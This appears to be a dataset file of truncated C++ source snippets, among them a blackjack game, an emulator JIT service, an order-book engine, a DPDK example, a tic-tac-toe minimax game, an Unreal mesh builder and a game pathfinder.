std::vector<FilterUnit *>    &filter_units = filter_stmt->filter_units();\n  for (const FilterUnit *filter_unit : filter_units) {\n    const FilterObj &filter_obj_left  = filter_unit->left();\n    const FilterObj &filter_obj_right = filter_unit->right();\n\n    unique_ptr<Expression> left(filter_obj_left.is_attr\n                                    ? static_cast<Expression *>(new FieldExpr(filter_obj_left.field))\n                                    : static_cast<Expression *>(new ValueEx",
    "\r\n#include <iostream>\r\n#include <stdlib.h>\r\nint Choice;\r\nint HitFunction(int PlayerHitHand);\r\nint SplitHitFunction(int SplitHitHand1);\r\nint SplitHit2Function(int SplitHitHand2);\r\nint SplitStay(int DealerHand);\r\nint StayFunction(int DealerStayHand);\r\nusing std::cout;\r\nusing std::cin;\r\nusing std::endl;\r\nint main()\r\n{\r\n\tsrand(static_cast<int>(time(NULL)));\r\n\tbool Play = true;\r\n\tbool Splitplay = false;\r\n\tint DealerCard1 = rand() % 11 + 1;\r\n\tint DealerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard1 = rand() % 11 + 1;\r\n\tint PlayerCard2 = rand() % 11 + 1;\r\n\tint PlayerCard3 = rand() % 11 + 1;\r\n\tint PlayerCard4 = rand() % 11 + 1;\r\n\tint DealerHand = DealerCard1 + DealerCard2;\r\n\tint PlayerHand = PlayerCard1 + PlayerCard2;\r\n\tif (PlayerCard1 && PlayerCard2 == 11)\r\n\t{\r\n\t\tPlayerCard1 -= 1;\r\n\t\tcout << \"Playercard1 is now equal to: \" << PlayerCard1 << endl;\r\n\t}\r\n\tif (DealerCard1 && DealerCard2 == 11)\r\n\t{\r\n\t\tDealerCard1 -= 1;\r\n\t\tcout << \"Dealercard1 is now equal to: \" << DealerCard1 << endl;\r\n\t}\r\n\tif (DealerHand == 21)\r\n\t{\r\n\t\tcout << \"Dealer has a natural blackjack you lose!\" << endl;\r\n\t\tPlay = false;\r\n\t\tSplitplay = false;\r\n\t\treturn 0;\r\n\t}\r\nif (PlayerCard1 == PlayerCard2 || Splitplay == true)\r\n{\r\n\t\t\r\nchar YesNo;\r\ncout << \"Your first card: \" << PlayerCard1 << \" \" << \"Your second card: \" << PlayerCard2 << endl;\r\ncout << \"Would you like to split?\" << endl;\r\ncout << \"Y/N\" << endl;\r\ncin >> YesNo;\r\nint PlayerHandSplit1 = PlayerCard1 + PlayerCard3;\r\nint PlayerHandSplit2 = PlayerCard2 + PlayerCard4;\r\nif (YesNo == 'Y' || YesNo == 'y')\r\n{\r\n\tdo\r\n\t{\r\n\t\tbool Hit1 = true;\r\n\t\tbool Hit = true;\r\n\t\tSplitplay = true;\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout << \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit1)\r\n\t{\r\n\t\tPlayerHandSplit1 += SplitHitFunction(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n        \tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\tif (PlayerHandSplit1 > 21 || PlayerHandSplit2 > 21)\r\n\t{\r\n\t\tcout << \"You busted! You lose!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit1 = false;\r\n\t}\r\n\tchar YesNo;\r\n\tcout << \"Would you like to hit again?\" << endl;\r\n\tcout << \"Y/N?\" << endl;\r\n\tcin >> YesNo;\r\n\tif (YesNo == 'Y' || YesNo == 'y')\r\n\t{\r\n\r\n\t}\r\n\telse\r\n\t{\r\n\t\tHit1 = false;\r\n\t}\r\n\t}\r\n\tbreak;\r\n\tcase 2:\r\n\twhile (DealerHand <= 16)\r\n\t{\r\n\t\tDealerHand += SplitStay(PlayerHandSplit1);\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Player:\" << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2\r\n\t\t<< \" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tHit1 = false;\r\n\t\tSplitplay = false;\r\n\t\tPlay = false;\r\n\tif (DealerHand > 21)\r\n\t{\r\n\t\tcout << \"Dealer busted! You win!\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 << \" \"\r\n\t\t<< \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tSplitplay = false;\r\n\t\tHit = false;\r\n\t\tPlay = false;\r\n\t}\r\n\t}\r\n\t\t\t\t\t\t\r\n\tbreak;\r\n\tdefault:\r\n\tbreak;\r\n\t}\r\n\tif (Play == true)\r\n\t{\r\n\t\tcout << \"Spliting...\" << endl;\r\n\t\tcout << \"Dealer:\" << endl;\r\n\t\tcout << DealerHand << endl;\r\n\t\tcout << \"Playercard 1: \" << PlayerCard1 << \" \" << \"Playercard 2: \" << PlayerCard2 <<\r\n\t\t\" \" << \"Playercard 3: \" << PlayerCard3 << \" \" << \"Playercard 4: \" << PlayerCard4 << endl;\r\n\t\tcout << \"Playerhand 1: \" << PlayerHandSplit1 << \" \" << \" Playerhand 2: \" << PlayerHandSplit2 << endl;\r\n\t\tcout << \"For second hand hit?\" << endl;\r\n\t\tcout << \"Would you like to hit?\" << endl;\r\n\t\tcout << \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit)\r\n\t{\r\n\t\tPlayerHandSplit2 += SplitHit2Function(PlayerHandSplit2);\r\n\t\tcout << \"Dealer:\" ",
    "// SPDX-FileCopyrightText: Copyright 2022 yuzu Emulator Project\n// SPDX-License-Identifier: GPL-2.0-or-later\n\n#include <array>\n#include <map>\n#include <span>\n#include <boost/icl/interval_set.hpp>\n#include <dynarmic/interface/A64/a64.h>\n#include <dynarmic/interface/A64/config.h>\n\n#include \"common/alignment.h\"\n#include \"common/common_funcs.h\"\n#include \"common/div_ceil.h\"\n#include \"common/elf.h\"\n#include \"common/logging/log.h\"\n#include \"core/hle/service/jit/jit_context.h\"\n#include \"core/memory.h\"\n\nusing namespace Common::ELF;\n\nnamespace Service::JIT {\n\nconstexpr std::array<u8, 8> SVC0_ARM64 = {\n    0x01, 0x00, 0x00, 0xd4, // svc  #0\n    0xc0, 0x03, 0x5f, 0xd6, // ret\n};\n\nconstexpr std::array HELPER_FUNCTIONS{\n    \"_stop\", \"_resolve\", \"_panic\", \"memcpy\", \"memmove\", \"memset\",\n};\n\nconstexpr size_t STACK_ALIGN = 16;\n\nclass JITContextImpl;\n\nusing IntervalSet = boost::icl::interval_set<VAddr>::type;\nusing IntervalType = boost::icl::interval_set<VAddr>::interval_type;\n\nclass DynarmicCallbacks64 : public Dynarmic::A64::UserCallbacks {\npublic:\n    explicit DynarmicCallbacks64(Core::Memory::Memory& memory_, std::vector<u8>& local_memory_,\n                                 IntervalSet& mapped_ranges_, JITContextImpl& parent_)\n        : memory{memory_}, local_memory{local_memory_},\n          mapped_ranges{mapped_ranges_}, parent{parent_} {}\n\n    u8 MemoryRead8(u64 vaddr) override {\n        return ReadMemory<u8>(vaddr);\n    }\n    u16 MemoryRead16(u64 vaddr) override {\n        return ReadMemory<u16>(vaddr);\n    }\n    u32 MemoryRead32(u64 vaddr) override {\n        return ReadMemory<u32>(vaddr);\n    }\n    u64 MemoryRead64(u64 vaddr) override {\n        return ReadMemory<u64>(vaddr);\n    }\n    u128 MemoryRead128(u64 vaddr) override {\n        return ReadMemory<u128>(vaddr);\n    }\n    std::string MemoryReadCString(u64 vaddr) {\n        std::string result;\n        u8 next;\n\n        while ((next = MemoryRead8(vaddr++)) != 0) {\n            result += next;\n        }\n\n        return result;\n    }\n\n    void MemoryWrite8(u64 vaddr, u8 value) override {\n        WriteMemory<u8>(vaddr, value);\n    }\n    void MemoryWrite16(u64 vaddr, u16 value) override {\n        WriteMemory<u16>(vaddr, value);\n    }\n    void MemoryWrite32(u64 vaddr, u32 value) override {\n        WriteMemory<u32>(vaddr, value);\n    }\n    void MemoryWrite64(u64 vaddr, u64 value) override {\n        WriteMemory<u64>(vaddr, value);\n    }\n    void MemoryWrite128(u64 vaddr, u128 value) override {\n        WriteMemory<u128>(vaddr, value);\n    }\n\n    bool MemoryWriteExclusive8(u64 vaddr, u8 value, u8) override {\n        return WriteMemory<u8>(vaddr, value);\n    }\n    bool MemoryWriteExclusive16(u64 vaddr, u16 value, u16) override {\n        return WriteMemory<u16>(vaddr, value);\n    }\n    bool MemoryWriteExclusive32(u64 vaddr, u32 value, u32) override {\n        return WriteMemory<u32>(vaddr, value);\n    }\n    bool MemoryWriteExclusive64(u64 vaddr, u64 value, u64) override {\n        return WriteMemory<u64>(vaddr, value);\n    }\n    bool MemoryWriteExclusive128(u64 vaddr, u128 value, u128) override {\n        return WriteMemory<u128>(vaddr, value);\n    }\n\n    void CallSVC(u32 swi) override;\n    void ExceptionRaised(u64 pc, Dynarmic::A64::Exception exception) override;\n    void InterpreterFallback(u64 pc, size_t num_instructions) override;\n\n    void AddTicks(u64 ticks) override {}\n    u64 GetTicksRemaining() override {\n        return std::numeric_limits<u32>::max();\n    }\n    u64 GetCNTPCT() override {\n        return 0;\n    }\n\n    template <class T>\n    T ReadMemory(u64 vaddr) {\n        T ret{};\n        if (boost::icl::contains(mapped_ranges, vaddr)) {\n            memory.ReadBlock(vaddr, &ret, sizeof(T));\n        } else if (vaddr + sizeof(T) > local_memory.size()) {\n            LOG_CRITICAL(Service_JIT, \"plugin: unmapped read @ 0x{:016x}\", vaddr);\n        } else {\n            std::memcpy(&ret, local_memory.data() + vaddr, sizeof(T));\n        }\n        return ret;\n    }\n\n    template <class T>\n    bool WriteMemory(u64 vaddr, const T value) {\n        if (boost::icl::contains(mapped_ranges, vaddr)) {\n            memory.WriteBlock(vaddr, &value, sizeof(T));\n        } else if (vaddr + sizeof(T) > local_memory.size()) {\n            LOG_CRITICAL(Service_JIT, \"plugin: unmapped write @ 0x{:016x}\", vaddr);\n        } else {\n            std::memcpy(local_memory.data() + vaddr, &value, sizeof(T));\n        }\n        return true;\n    }\n\nprivate:\n    Core::Memory::Memory& memory;\n    std::vector<u8>& local_memory;\n    IntervalSet& mapped_ranges;\n    JITContextImpl& parent;\n};\n\nclass JITContextImpl {\npublic:\n    explicit JITContextImpl(Core::Memory::Memory& memory_) : memory{memory_} {\n        callbacks =\n            std::make_unique<DynarmicCallbacks64>(memory, local_memory, mapped_ranges, *this);\n        user_config.callbacks = callbacks.get();\n        jit = std::make_unique<Dynarmic::A64::Jit>(user_config);\n    }\n\n    bool LoadNRO(std::span<const u8> data) {\n        local_memory.clear();\n\n        relocba",
    "#include \"libary.h\"\n\nenum class OrderType\n{\n\tGoodTillCancel,  // holds till user says no and cancels the damn order\n\tFillandKill // completely execute the entire order immediately (fill) or cancel the entire order (kill) if it cannot be filled immediately. (have time constrains)\n};\n\nenum class Side\n{\n\tBuy,\n\tSell\n};\n\n\nusing Price = std::int32_t;\nusing Quantity = std::uint32_t;\nusing OrderID = std::uint64_t; // string here?\n\nstruct LevelInfo\n{\n\tPrice price_;\n\tQuantity quantity_;\n};\n\nusing LevelInfos = std::vector<LevelInfo>;\n\nclass OrderbookLevelInfos\n{\npublic:\n\tOrderbookLevelInfos(const LevelInfos& bids, const LevelInfos& asks)\n\t\t: bids_{ bids }\n\t\t, asks_{ asks }\n\t{ }\n\n\tconst LevelInfos& GetBids() const { return bids_; }\n\tconst LevelInfos& GetAsks() const { return asks_; }\n\nprivate:\n\tLevelInfos bids_;\n\tLevelInfos asks_;\n};\n\nclass Order\n{\npublic:\n    Order(OrderType orderType, OrderID orderID, Side side, Price price, Quantity quantity)\n        : orderType_{ orderType }, orderID_{ orderID }, side_{ side },\n        price_{ price }, initialQuantity_{ quantity }, remainingQuantity_{ quantity } {}\n\n    OrderType GetOrderType() const { return orderType_; }\n    OrderID GetOrderID() const { return orderID_; }\n    Side GetSide() const { return side_; }\n    Price GetPrice() const { return price_; }\n    Quantity GetInitialQuantity() const { return initialQuantity_; }\n    Quantity GetRemainingQuantity() const { return remainingQuantity_; }\n    Quantity GetFilledQuantity() const { return GetInitialQuantity() - GetRemainingQuantity(); }\n    bool isFilled() const { return  GetRemainingQuantity() == false;  }\n    void Fill(Quantity quantity)\n    {\n        if (quantity > GetRemainingQuantity())\n        {\n            std::ostringstream oss;\n            oss << \"Order (\" << GetOrderID() << \") cannot be filled for more than its remainder quantity.\";\n            throw std::logic_error(oss.str());\n        }\n\n        remainingQuantity_ -= quantity;\n    }\n\nprivate:\n    OrderType orderType_;\n    OrderID orderID_;\n    Side side_;\n    Price price_;\n    Quantity initialQuantity_;\n    Quantity remainingQuantity_;\n};\n\nusing OrderPointer = std::shared_ptr<Order>;\nusing OrderPointers = std::list<OrderPointer>;\n\nclass OrderModify\n{\npublic :\n    OrderModify(OrderID orderID, Side side, Price price, Quantity quantity)\n        : orderID_{ orderID }\n        , price_{ price }\n        , side_{ side }\n        , quantity_{ quantity }\n    { }\n\n    OrderID GetOrderID() const { return orderID_; }\n    Side GetSide() const { return side_; }\n    Price GetPrice() const { return price_; }\n    Quantity GetQuantity() const { return quantity_; }\n\n    OrderPointer ToOrderPointer( OrderType type  ) const\n    {\n        return std::make_shared<Order>(type, GetOrderID(), GetSide(), GetPrice(), GetQuantity());\n    }\n\nprivate:\n    OrderID orderID_;\n    Price price_;\n    Side side_;\n    Quantity quantity_;\n};\n\n\nstruct TradeInfo //interface for tthe trade\n{\n    OrderID orderID_;\n    Price price_;\n    Quantity quantity_;\n};\n\nclass Trade // aggreaation of bid and ask sides.\n{\npublic:\n    Trade (const TradeInfo& bidTrade, const TradeInfo& askTrade)\n        : bidTrade_ {bidTrade}\n        , askTrade_ {askTrade}\n    { }\n\n    const TradeInfo& GetBidTrade() const { return bidTrade_; }\n    const TradeInfo& GetAskTrade() const { return askTrade_; }\n\nprivate:\n    TradeInfo bidTrade_;\n    TradeInfo askTrade_;\n\n\n};\n\n\nusing Trades = std::vector<Trade>;\n\nclass Orderbook\n{\nprivate:\n    //using a map for bids (in descending from best bid ) and ask (ascending for best ask) we can have O(N) access . \n    // order iterator for its location \n    struct OrderEntry\n    {\n        OrderPointer order_{ nullptr };\n        OrderPointers::iterator location_;\n\n    };\n\n\n    std::map<Price, OrderPointers, std::greater<Price>> bids_;\n    std::map<Price, OrderPointers, std::less<Price>> asks_;\n    std::unordered_map<OrderID, OrderEntry> orders_;\n\n    //match methods\n    // so we add an order, if its not f&k we add to the list, else if it doesnt match , we discard instantly\n\n    bool CanMatch(Side side, Price price) const\n    {\n        if (side == Side::Buy)\n        {\n            if (asks_.empty())\n                return false;\n\n            const auto& [bestAsk, _] = *asks_.begin();\n            return price >= bestAsk;\n        }\n        else\n        {\n            if (bids_.empty())\n                return false;\n\n            const auto& [bestBid, _] = *bids_.begin();\n            return price <= bestBid;\n        }\n    }\n\n    Trades MatchOrders()\n    {\n        Trades trades;\n        trades.reserve(orders_.size());\n\n        while (true)\n        {\n            if (bids_.empty() || asks_.empty())\n                break;\n\n            auto& [bidPrice, bids] = *bids_.begin();\n            auto& [askPrice, asks] = *asks_.begin();\n\n            if (bidPrice < askPrice)\n                break;\n\n            while (!bids.empty() && !asks.empty())\n            {\n                auto bid = bids.front();\n                auto as",
    "/* SPDX-License-Identifier: BSD-3-Clause\n * Copyright(c) 2010-2014 Intel Corporation\n */\n\n#include <stdio.h>\n#include <string.h>\n#include <stdint.h>\n#include <vector>\n#include <string>\n#include <errno.h>\n#include <sys/queue.h>\n\n#include <rte_memory.h>\n#include <rte_launch.h>\n#include <rte_eal.h>\n#include <rte_per_lcore.h>\n#include <rte_lcore.h>\n#include <rte_debug.h>\n\n/* Launch a function on lcore. 8< */\nstatic int\nlcore_hello(__rte_unused void *arg)\n{\n        unsigned lcore_id;\n        lcore_id = rte_lcore_id();\n        printf(\"hello from core %u\\n\", lcore_id);\n        return 0;\n}\n/* >8 End of launching function on lcore. */\n\n/* Initialization of Environment Abstraction Layer (EAL). 8< */\nint main(int argc, char **argv)\n{\n        unsigned lcore_id;\n\n        int ret{};\n        if (argc == 1)\n        {\n            // If no arguments are passed, use default ones\n            char *default_args[] = {argv[0], \"-l\", \"0-3\", \"-n\", \"4\"};\n            argc = sizeof(default_args) / sizeof(default_args[0]);\n   ret = rte_eal_init(argc, default_args);\n        }\n        else\n        {\n            ret = rte_eal_init(argc, argv);\n        }\n\n        if (ret < 0)\n        {\n            rte_panic(\"Cannot init EAL\\n\");\n        }\n        /* >8 End of initialization of Environment Abstraction Layer */\n\n        /**\n         * @brief Once the EAL is initialized, the application is ready to launch a function on an lcore.\n         * lcore_hello() is called on every available lcore.\n         */\n        RTE_LCORE_FOREACH_WORKER(lcore_id){\n                rte_eal_remote_launch(lcore_hello, NULL, lcore_id);\n        }\n\n        /* call it on main lcore too */\n        lcore_hello(NULL);\n        /* >8 End of launching the function on each lcore. */\n\n        rte_eal_mp_wait_lcore();\n\n        /* clean up the EAL */\n        rte_eal_cleanup();\n\n        return 0;\n}\n",
    "#include <iostream>\n#include <vector>\n#include <string>\n#include <exception>\n#include <sstream>\n#include <ctime>\n\n#define LIGHT_RED \"\\033[91m\";\n#define BLUE \"\\033[36m\";\n#define RESET_COLOR \"\\033[0m\";\nconst int SZ = 3;\n\nusing namespace std;\n\nclass Board {\n\tvector<char> b;\npublic:\n\tBoard() : b(SZ*SZ, ' ') {}\n\t~Board() {}\n\tBoard(const Board& board) : b(board.b) {}\n\n\tvoid display(int cell1 = -1, int cell2 = -1, int cell3 = -1) {\n\t\tcout << \"-------------\\n\";\n\t\tfor (int i = 0; i < SZ; i++) {\n\t\t\tcout << \"| \";\n\t\t\tfor (int j = 0; j < SZ; j++) {\n\t\t\t\tif (cell1 == -9) cout << BLUE;\n\t\t\t\tif (i * SZ + j == cell1 - 1 || i * SZ + j == cell2 - 1 || i * SZ + j == cell3 - 1) cout << LIGHT_RED;\n\t\t\t\tcout << b[i * SZ + j] << RESET_COLOR;\n\t\t\t\tcout << \" | \";\n\t\t\t}\n\t\t\tcout << \"\\n-------------\\n\";\n\t\t}\n\t}\n\tbool cellEmpty(int cell) {\n\t\tif (b[cell - 1] == ' ') return true;\n\t\treturn false;\n\t}\n\tbool checkFull() {\n\t\tfor (int i = 0; i < 9; i++) if (b[i] == ' ') return false;\n\t\treturn true;\n\t}\n\tbool checkWin(char symbol) {\n\t\tfor (int i = 0; i < SZ; i++) {\n\t\t\tif (b[i] == symbol && b[i] == b[i + 3] && b[i] == b[i + 6]) return true;\n\t\t\tif (b[i * 3] == symbol && b[i * 3] == b[i * 3 + 1] && b[i * 3] == b[i * 3 + 2]) return true;\n\t\t}\n\t\tif (b[0] == symbol && b[0] == b[4] && b[0] == b[8]) return true;\n\t\tif (b[2] == symbol && b[2] == b[4] && b[2] == b[6]) return true;\n\t\treturn false;\n\t}\n\tvoid makeMove(int cell, char symbol) {\n\t\tb[cell - 1] = symbol;\n\t}\n\tvector<int> availableMoves() {\n\t\tvector<int> v;\n\t\tfor (int i = 1; i < 10; i++) if (cellEmpty(i)) v.push_back(i);\n\t\treturn v;\n\t}\n\tvoid displayWin(char symbol) {\n\t\tint c1, c2, c3;\n\t\tif (b[0] == symbol && b[0] == b[4] && b[0] == b[8]) { c1 = 0; c2 = 4; c3 = 8; }\n\t\telse if (b[2] == symbol && b[2] == b[4] && b[2] == b[6]) { c1 = 2; c2 = 4; c3 = 6; }\n\t\telse \n\t\t\tfor (int i = 0; i < SZ; i++) {\n\t\t\t\tif (b[i] == symbol && b[i] == b[i + 3] && b[i] == b[i + 6]) { c1 = i; c2 = i + 3; c3 = i + 6; }\n\t\t\t\tif (b[i * 3] == symbol && b[i * 3] == b[i * 3 + 1] && b[i * 3] == b[i * 3 + 2]) { c1 = i * 3; c2 = i * 3 + 1; c3 = i * 3 + 2; }\n\t\t\t}\n\t\tc1++; c2++; c3++;\n\t\tdisplay(c1, c2, c3);\n\t}\n};\n\nclass Player {\n\tchar symbol;\npublic:\n\tPlayer(char s) : symbol(s) {}\n\tvirtual ~Player(){}\n\tPlayer(const Player& p) :symbol(p.symbol) {}\n\tvirtual Player* clone() const = 0;\n\n\tchar getSymbol() { return symbol; }\n\tvirtual void move(Board &b) = 0;\n};\n\nclass Human : public Player {\npublic:\n\tHuman(char s) : Player(s) {}\n\t~Human() {}\n\tHuman(const Human& h) :Player(h) {}\n\tPlayer* clone() const { return new Human(*this); }\n\n\tvoid move(Board& b) {\n\t\tcout << \"\\nNguoi choi \" << getSymbol() << \" chon vi tri danh (1-9): \";\n\t\tstring s; cin >> s;\n\t\tstringstream ss(s);\n\t\tint cell; ss >> cell;\n\t\ttry {\n\t\t\tif (cell < 1 || cell>9) throw out_of_range(\"-O khong hop le!\\n-Vui long chon lai!\\n\\n\");\n\t\t\telse if (!b.cellEmpty(cell)) throw invalid_argument(\"-O da duoc chon!\\n-Vui long chon lai!\\n\\n\");\n\t\t\telse {\n\t\t\t\tb.makeMove(cell, getSymbol());\n\t\t\t\tb.display(cell);\n\t\t\t}\n\t\t}\n\t\tcatch (out_of_range& e) {\n\t\t\tcerr << e.what();\n\t\t\tmove(b);\n\t\t}\n\t\tcatch (invalid_argument& e) {\n\t\t\tcerr << e.what();\n\t\t\tmove(b);\n\t\t}\n\t}\n};\n\nclass Computer : public Player {\n\tchar OSymbol;\n\n\tint minimax(Board b, int d, bool mp, char self, char opponent) {\n\t\tif (b.checkWin(self)) return 1;\n\t\tif (b.checkWin(opponent)) return -1;\n\t\tif (b.checkFull() || d == 0) return 0;\n\n\t\tvector<int> moves = b.availableMoves();\n\n\t\tif (mp) {\n\t\t\tint score = -10;\n\t\t\tfor (int move : moves) {\n\t\t\t\tb.makeMove(move, self);\n\t\t\t\tscore = max(score, minimax(b, d - 1, false, self, opponent));\n\t\t\t\tb.makeMove(move, ' ');\n\t\t\t}\n\t\t\treturn score;\n\t\t}\n\t\telse {\n\t\t\tint score = 10;\n\t\t\tfor (int move : moves) {\n\t\t\t\tb.makeMove(move, opponent);\n\t\t\t\tscore = min(score, minimax(b, d - 1, true, self, opponent));\n\t\t\t\tb.makeMove(move, ' ');\n\t\t\t}\n\t\t\treturn score;\n\t\t}\n\t}\npublic:\n\tComputer(char s) :Player(s), OSymbol(' ') {}\n\t~Computer() {}\n\tComputer(const Computer& c) :Player(c), OSymbol(c.OSymbol) {}\n\tPlayer* clone() const { return new Computer(*this); }\n\n\tvoid setOSymbol(char s) { OSymbol = s; }\n\tint getBestMove(Board b, char self, char opponent) {\n\t\tint bestScore = -10, bestMove = -10;\n\n\t\tvector<int> moves = b.availableMoves();\n\t\tfor (int move : moves) {\n\t\t\tb.makeMove(move, self);\n\t\t\tint score = minimax(b, 5, false, self, opponent);\n\t\t\tb.makeMove(move, ' ');\n\t\t\tif (score > bestScore) {\n\t\t\t\tbestScore = score;\n\t\t\t\tbestMove = move;\n\t\t\t}\n\t\t}\n\t\treturn bestMove;\n\t}\n\tvoid move(Board& b) {\n\t\tint cell = getBestMove(b, getSymbol(), OSymbol);\n\t\tb.makeMove(cell, getSymbol());\n\t\tcout << \"\\nNguoi may \" << getSymbol() << \": \" << cell << endl;\n\t\tb.display(cell);\n\t}\n};\n\nclass Game {\n\tBoard b;\n\tPlayer* p1, * p2;\npublic:\n\tGame() :p1(NULL), p2(NULL) {}\n\t~Game() { delete p1; delete p2; }\n\tGame(const Game& g) : b(g.b), p1(NULL), p2(NULL) {\n\t\tif (g.p1) p1 = g.p1->clone();\n\t\tif (g.p2) p2 = g.p2->clone();\n\t}\n\n\tvoid start() {\n\t\tcout << \"Chao mung den voi Tro choi Tic Tac Toe!\\n\";\n\t\tcout << \"Ban co the nhap vi tri cua o ma ban muon danh.\\n\";\n\t\tcout << \"Vi tri tu 1 den 9 duoc",
    "/*\n* From http://www.redblobgames.com/maps/mapgen2/\n* Original work copyright 2017 Red Blob Games <redblobgames@gmail.com>\n* Unreal Engine 4 implementation copyright 2018 Jay Stevens <jaystevens42@gmail.com>\n*\n* Licensed under the Apache License, Version 2.0 (the \"License\");\n* you may not use this file except in compliance with the License.\n* You may obtain a copy of the License at\n*\n* http://www.apache.org/licenses/LICENSE-2.0\n*\n* Unless required by applicable law or agreed to in writing, software\n* distributed under the License is distributed on an \"AS IS\" BASIS,\n* WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n* See the License for the specific language governing permissions and\n* limitations under the License.\n*/\n\n#include \"Mesh/IslandPoissonMeshBuilder.h\"\n#include \"DualMeshBuilder.h\"\n\nUIslandPoissonMeshBuilder::UIslandPoissonMeshBuilder()\n{\n\tPoissonSize = FVector2D(100000.0, 100000.0);\n\tPoissonSpacing = 1075.0f;\n\tPoissonSamples = 30;\n}\n\nvoid UIslandPoissonMeshBuilder::AddPoints_Implementation(UDualMeshBuilder* Builder, FRandomStream& Rng) const\n{\n\tBuilder->AddPoisson(Rng, MapSize - PoissonSize, PoissonSpacing, PoissonSamples);\n}\n",
    "#include \"JoePathFinder.h\"\n\n#include <chrono>\n#include <numeric>\n#include <queue>\n#include <set>\n#include <unordered_map>\n#include <vector>\n\n#include \"../../Memory/GameData.h\"\n#include \"../../Utils/Logger.h\"\n#include \"../../Utils/Utils.h\"\n\nJoePathFinder::JoePathFinder(Vec3i start, BlockSource* reg, std::shared_ptr<JoeGoal> goal) : startPos(start), region(reg), goal(goal) {\n}\n\nstruct NodeRef {\n\t__int64 hash;\n\t__forceinline bool isInvalid() const {\n\t\treturn hash == 0xFFFFFFFFFFFFFFFF;\n\t}\n\tNodeRef(__int64 hash) : hash(hash) {}\n\tNodeRef() : hash(-1){};\n};\n\nstruct Node {\n\tVec3i pos;\n\tfloat fScore;  // heuristic\n\tfloat gScore;  // total cost\n\tstruct {\n\t\tNodeRef nodeBefore = {-1};\n\t\tJoeSegmentType edgeType = JoeSegmentType::INVALID;\n\t} cameFrom;\n\tbool isClosed;\n\tbool isInOpenSet;\n\n\tNode(const Vec3i& pos, float fScore, float gScore) : pos(pos), fScore(fScore), gScore(gScore), isClosed(false), isInOpenSet(false) {}\n};\n\nstruct Edge {\n\tNodeRef startNode, endNode;\n\tfloat cost;\n\tJoeSegmentType type;\n\n\tEdge(const NodeRef& startNode, const NodeRef& endNode, float cost, JoeSegmentType type) : startNode(startNode), endNode(endNode), cost(cost), type(type) {}\n};\n__forceinline unsigned __int64 rotBy(int in, unsigned int by) {\n\tauto mut = static_cast<unsigned __int64>(in);\n\treturn ((mut & 0x7FFFFFui64) | ((static_cast<unsigned int>(in) >> 8u) & 0x800000u) /*copy sign bit*/) << by;\n}\n\n__forceinline unsigned __int64 posToHash(const Vec3i& pos) {\n\treturn rotBy(pos.x, 0) | rotBy(pos.z, 24) | (static_cast<unsigned __int64>(pos.y) << 48u);\n}\n\nNodeRef findNode(std::unordered_map<unsigned __int64, Node>& allNodes, Vec3i& pos) {\n\tauto posHash = posToHash(pos);\n\tauto res = allNodes.find(posHash);\n\tif (res != allNodes.end()) {\n\t\treturn NodeRef(posHash);\n\t}\n\n\tallNodes.emplace(posHash, Node(pos, 0.f, 10000000.f));\n\treturn NodeRef(posHash);\n}\n\n__forceinline bool isDangerous(const Vec3i& pos, BlockSource* reg, bool allowWater) {\n\tauto obs1 = reg->getBlock(pos)->toLegacy();\n\tif (obs1->material->isSuperHot)\n\t\treturn true;\n\tif (!allowWater && (obs1->material->isLiquid || obs1->hasWater(reg, pos)))\n\t\treturn true;\n\n\t// contact damage based\n\t{\n\t\t// there is a function called dealsContactDamage but it takes in so many parameters + plant growth that its not useful anymore\n\t\tstatic std::set<uintptr_t**> knownVtableSet;\n\t\tstatic std::vector<const char*> dangerousTiles{\"sweet_berry_bush\", \"magma\", \"wither_rose\", \"cactus\", 